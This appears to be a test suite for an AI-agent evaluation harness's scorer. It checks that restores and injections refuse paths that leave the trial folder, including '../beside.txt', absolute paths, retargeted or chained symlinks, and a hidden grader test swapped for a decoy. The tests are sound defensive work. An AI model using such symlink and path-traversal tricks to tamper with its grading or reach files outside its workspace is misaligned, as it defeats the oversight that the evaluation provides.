        put(r.fixtureDir, "node_modules/pkg/bin/x.sh", "#!/bin/sh\necho x\n");
        mkdirSync(join(r.fixtureDir, "node_modules", ".bin"));
        symlinkSync("../pkg/bin/x.sh", join(r.fixtureDir, "node_modules", ".bin", "x"));
        put(r.fixtureDir, "vendor/lib/index.js", "// lib\n");
        symlinkSync("vendor/lib", join(r.fixtureDir, "deps"));
        copyTree(r.fixtureDir, r.trialDir, r.fixtureDir);
      }

      it("is copied as it is by a restore of the folder it is in: the .bin link leads to the restored file, in the trial", async () => {
        const r = rig(look);
        withLinks(r);
        rmSync(join(r.trialDir, "node_modules"), { recursive: true });
        put(r.trialDir, "node_modules/junk.js", "// the agent's\n");

        scored(await r.score([command({ restore: ["node_modules"] })]));

        expect(readlinkSync(join(r.trialDir, "node_modules", ".bin", "x"))).toBe("../pkg/bin/x.sh");
        expect(realpathSync.native(join(r.trialDir, "node_modules", ".bin", "x")))
          .toBe(join(realpathSync.native(r.trialDir), "node_modules", "pkg", "bin", "x.sh")); // the trial's own file, not the fixture's
        expect(seen[0]["node_modules/.bin/x"]).toBe("#!/bin/sh\necho x\n"); // and the command found it through the link
        expect(seen[0]).not.toHaveProperty("node_modules/junk.js");
      });

      it("is put back as the fixture had it when it is the restored path itself: the agent's retargeting is undone, and what it pointed to is left alone", async () => {
        const r = rig();
        withLinks(r);
        const outside = folder("harness-outside-");
        put(outside, "index.js", "// not the trial's\n");
        rmSync(join(r.trialDir, "deps"));
        symlinkSync(outside, join(r.trialDir, "deps")); // the agent points it elsewhere

        const result = scored(await r.score([command({ restore: ["deps"] })]));

        expect(result.reward).toBe(1);
        expect(readlinkSync(join(r.trialDir, "deps"))).toBe("vendor/lib");
        expect(read(outside, "index.js")).toBe("// not the trial's\n");
      });

      it("stays untrusted at run time: when an agent retargets it out of the folder, a restore through it makes the trial missing and deletes nothing outside", async () => {
        const r = rig();
        withLinks(r);
        const outside = folder("harness-outside-");
        put(outside, "index.js", "// not the trial's\n");
        rmSync(join(r.trialDir, "deps"));
        symlinkSync(outside, join(r.trialDir, "deps"));

        const result = await r.score([command({ restore: ["deps/index.js"] })]);

        expect(result).toMatchObject({ missing: expect.stringContaining("deps/index.js leads out of the trial's folder through a link") });
        expect(read(outside, "index.js")).toBe("// not the trial's\n");
        expect(r.calls).toEqual([]);
      });

      it("lets a restore go through it when it stays inside: the file is put back where the link leads, and the link is left as it is", async () => {
        const r = rig();
        withLinks(r);
        put(r.trialDir, "vendor/lib/index.js", "// the agent's edit\n");

        scored(await r.score([command({ restore: ["deps/index.js"] })]));

        expect(read(r.trialDir, "vendor/lib/index.js")).toBe("// lib\n");
        expect(readlinkSync(join(r.trialDir, "deps"))).toBe("vendor/lib");
      });

      it("is checked again when a restore copies it: a link that no longer qualifies makes the trial missing", async () => {
        const r = rig();
        withLinks(r);
        // After the task set was read, the link was made absolute: in a copy it would lead to the fixture.
        rmSync(join(r.fixtureDir, "deps"));
        symlinkSync(join(r.fixtureDir, "vendor", "lib"), join(r.fixtureDir, "deps"));

        const result = await r.score([command({ restore: ["deps"] })]);

        expect(result).toMatchObject({ missing: expect.stringMatching(/^scorer tests: .*deps is a link with an absolute target/) });
      });
    });

    it("is refused for an inject source or a workspace that is no longer the place the task set recorded: a link has taken its place", async () => {
      const r = rig();
      put(r.graderDir, "hidden.test.js", "// real\n");
      const decoy = folder("harness-decoy-");
      put(decoy, "x.js", "// decoy\n");
      rmSync(join(r.graderDir, "hidden.test.js"));
      symlinkSync(join(decoy, "x.js"), join(r.graderDir, "hidden.test.js"));

      const injected = await r.score([command({ inject: [{ from: join(r.graderDir, "hidden.test.js"), to: "test/hidden.test.js" }] })]);

      expect(injected).toMatchObject({ missing: expect.stringContaining("is not the place it was when the task set was read") });
      expect(existsSync(join(r.trialDir, "test"))).toBe(false);

      put(r.fixtureDir, "package.json", "{}\n");
      const moved = join(dirname(r.fixtureDir), "fixture-real");
      renameSync(r.fixtureDir, moved);
      symlinkSync(moved, r.fixtureDir);
      const restored = await r.score([command({ restore: ["package.json"] })]);

      expect(restored).toMatchObject({ missing: expect.stringContaining("is not the place it was when the task set was read") });
      expect(r.calls).toEqual([]);
    });
  });

  it("refuses a path that leaves the trial's folder, even though the task set was checked", async () => {
    const r = rig();
    put(dirname(r.trialDir), "beside.txt", "keep\n"); // next to the trial's folder

    expect(await r.score([command({ restore: ["../beside.txt"] })])).toMatchObject({ missing: expect.stringContaining("leaves the trial's folder") });
    expect(await r.score([command({ inject: [{ from: join(r.fixtureDir), to: "../beside.txt" }] })])).toHaveProperty("missing");
    expect(await r.score([command({ restore: [join(dirname(r.trialDir), "beside.txt")] })])).toMatchObject({ missing: expect.stringContaining("is not relative") });
    expect(read(dirname(r.trialDir), "beside.txt")).toBe("keep\n");
    expect(r.calls).toEqual([]);
  });
});

describe("stopping", () => {
  it("scores nothing when the eval was interrupted before the trial's scoring began", async () => {
    const r = rig();
    r.cancel.now = true;

    expect(await r.score([command(), output({ contains: ["x"] })])).toEqual({ cancelled: true });
    expect(r.calls).toEqual([]);
  });

  it("gives up the trial when it is interrupted while a command runs: the command was stopped, not failed", async () => {
    const r = rig(() => { r.cancel.now = true; return { exitCode: 137 }; });

    expect(await r.score([command()])).toEqual({ cancelled: true });
  });

  it("gives up the trial when it is interrupted between two scorers", async () => {
    const r = rig();

    const result = await r.score([output({ contains: ["SUP-A"] }), output({ name: "second", contains: ["SUP-A"] })], {
      isCancelled: (() => { let asked = 0; return () => ++asked > 1; })(),
    });

    expect(result).toEqual({ cancelled: true });
  });
});

describe("the texts that tell a timeout from a command that could not start", () => {
  it("are pinned to harness-core's: execute_command's two errors in process_commands.rs", () => {
    const rust = readFileSync(join(root, "src-tauri", "src", "commands", "process_commands.rs"), "utf8");

    expect(rust).toContain('"Command timed out after {} s"');
    expect(rust).toContain('format!("Could not start the command: {e}")');
    expect("Command timed out after {} s".startsWith(COMMAND_TIMEOUT_PREFIX)).toBe(true);
    expect("Could not start the command: {e}".startsWith(COMMAND_TIMEOUT_PREFIX)).toBe(false);
  });
});

describe("copyTree", () => {
  it("copies a file, a folder and what is in it, creating the folders on the way", () => {
    const base = folder();
    put(base, "from/a.txt", "a");
    put(base, "from/sub/b.txt", "b");

    copyTree(join(base, "from"), join(base, "to", "deep"));
    copyTree(join(base, "from", "a.txt"), join(base, "x", "y", "a.txt"));

    expect(snapshot(join(base, "to"))).toEqual({ "deep/a.txt": "a", "deep/sub/b.txt": "b" });
    expect(read(base, "x/y/a.txt")).toBe("a");
  });

  it.skipIf(!canLink)("keeps a file's executable bit: a fixture's scripts still run", () => {
    const base = folder();
    put(base, "from/run.sh", "#!/bin/sh\n");
    chmodSync(join(base, "from", "run.sh"), 0o755);

    copyTree(join(base, "from"), join(base, "to"));

    expect(lstatSync(join(base, "to", "run.sh")).mode & 0o777).toBe(0o755);
  });

  it("refuses what is not there", () => {
    const base = folder();

    expect(() => copyTree(join(base, "none"), join(base, "to"))).toThrow(/does not exist/);
    expect(existsSync(join(base, "to"))).toBe(false);
  });

  it.skipIf(!canLink)("refuses a link when no fixture is given, at the top or inside a folder: a grader folder may not have one", () => {
    const base = folder();
    put(base, "from/a.txt", "a");
    symlinkSync("a.txt", join(base, "from", "alias"));

    expect(() => copyTree(join(base, "from"), join(base, "to"))).toThrow(/is a link/);
    expect(() => copyTree(join(base, "from", "alias"), join(base, "to2"))).toThrow(/is a link/);
  });

  describe.skipIf(!canLink)("a fixture's links", () => {
    it("are copied as they are, with the target text they had: the copy's link points inside the copy", () => {
      const base = folder();
      put(base, "fixture/pkg/bin/x", "#!/bin/sh\n");
      put(base, "fixture/sub/f.txt", "f\n");
      mkdirSync(join(base, "fixture", ".bin"));
      symlinkSync("../pkg/bin/x", join(base, "fixture", ".bin", "x"));
      symlinkSync("sub", join(base, "fixture", "alias"));

      copyTree(join(base, "fixture"), join(base, "copy"), join(base, "fixture"));

      expect(readlinkSync(join(base, "copy", ".bin", "x"))).toBe("../pkg/bin/x");
      expect(readlinkSync(join(base, "copy", "alias"))).toBe("sub");
      // They lead to the copy's own files, not the fixture's.
      expect(realpathSync.native(join(base, "copy", ".bin", "x"))).toBe(join(base, "copy", "pkg", "bin", "x"));
      expect(realpathSync.native(join(base, "copy", "alias"))).toBe(join(base, "copy", "sub"));
      expect(lstatSync(join(base, "copy", "alias")).isSymbolicLink()).toBe(true);
    });

    it("are checked again as they are copied: a link that was fine when the task set was read and is not now is refused", () => {
      const fixtureWith = (target: string) => {
        const base = folder();
        put(base, "fixture/a.txt", "a");
        symlinkSync(target, join(base, "fixture", "link"));
        return base;
      };

      const absolute = fixtureWith(join(folder(), "elsewhere"));
      expect(() => copyTree(join(absolute, "fixture"), join(absolute, "copy"), join(absolute, "fixture"))).toThrow(/absolute target/);
      const out = fixtureWith("../outside");
      expect(() => copyTree(join(out, "fixture"), join(out, "copy"), join(out, "fixture"))).toThrow(/climbs out of the fixture/);
      const dangling = fixtureWith("nothing-here");
      expect(() => copyTree(join(dangling, "fixture"), join(dangling, "copy"), join(dangling, "fixture"))).toThrow(/link to nothing/);
    });

    it("are read as the kernel reads them: a chain whose text stays inside leads out, and is refused", () => {
      const base = folder();
      put(base, "fixture/a/keep.txt", "k");
      symlinkSync("..", join(base, "fixture", "a", "up"));
      symlinkSync("a/up/..", join(base, "fixture", "b")); // as text inside; to the kernel, the folder above the fixture

      expect(() => copyTree(join(base, "fixture"), join(base, "copy"), join(base, "fixture"))).toThrow(/b is a link whose target .*climbs out of the fixture/);
    });

    it("are refused when their walk goes above the fixture and comes back in by its name: in the copy that name is not the fixture", () => {
      const base = folder();
      put(base, "fixture/package.json", "{}");
      mkdirSync(join(base, "fixture", "x"));
      symlinkSync("..", join(base, "fixture", "x", "a")); // x/a is the fixture's own folder
      symlinkSync("x/a/../fixture/package.json", join(base, "fixture", "back")); // ends at the fixture's own file, by way of the folder above it

      expect(() => copyTree(join(base, "fixture"), join(base, "copy"), join(base, "fixture"))).toThrow(/back is a link whose target .*climbs out of the fixture/);
    });

    it("are never entered: a link to the folder it is in is copied as a link, and is no loop", () => {
      const base = folder();
      mkdirSync(join(base, "fixture"));
      symlinkSync(".", join(base, "fixture", "self"));

      copyTree(join(base, "fixture"), join(base, "copy"), join(base, "fixture"));

      expect(readlinkSync(join(base, "copy", "self"))).toBe(".");
      expect(readdirSync(join(base, "copy"))).toEqual(["self"]);
    });
  });

  describe("copyFixture", () => {
    it("copies the fixture, links and all, when it is the place the task set recorded", () => {
      const base = folder();
      put(base, "fixture/a.txt", "a");

      copyFixture(join(base, "fixture"), join(base, "copy"));

      expect(read(base, "copy/a.txt")).toBe("a");
    });

    it("refuses a fixture that is no longer there", () => {
      const base = folder();

      expect(() => copyFixture(join(base, "gone"), join(base, "copy"))).toThrow();
      expect(existsSync(join(base, "copy"))).toBe(false);
    });

    it.skipIf(!canLink)("refuses a fixture a link has taken the place of, or the place of a folder above it", () => {
      const base = folder();
      put(base, "real/fixture/a.txt", "a");
      put(base, "other/fixture/a.txt", "decoy");
      const recorded = join(base, "real", "fixture"); // the real path the task set recorded
      rmSync(recorded, { recursive: true });
      symlinkSync(join(base, "other", "fixture"), recorded);
      expect(() => copyFixture(recorded, join(base, "copy1"))).toThrow(/is not the place it was when the task set was read/);

      const above = folder();
      put(above, "real/fixture/a.txt", "a");
      put(above, "other/fixture/a.txt", "decoy");
      const deep = join(above, "real", "fixture");
      rmSync(join(above, "real"), { recursive: true });
      symlinkSync(join(above, "other"), join(above, "real"));
      expect(() => copyFixture(deep, join(above, "copy2"))).toThrow(/is not the place it was/);
      expect(existsSync(join(above, "copy2"))).toBe(false);
    });
  });
});
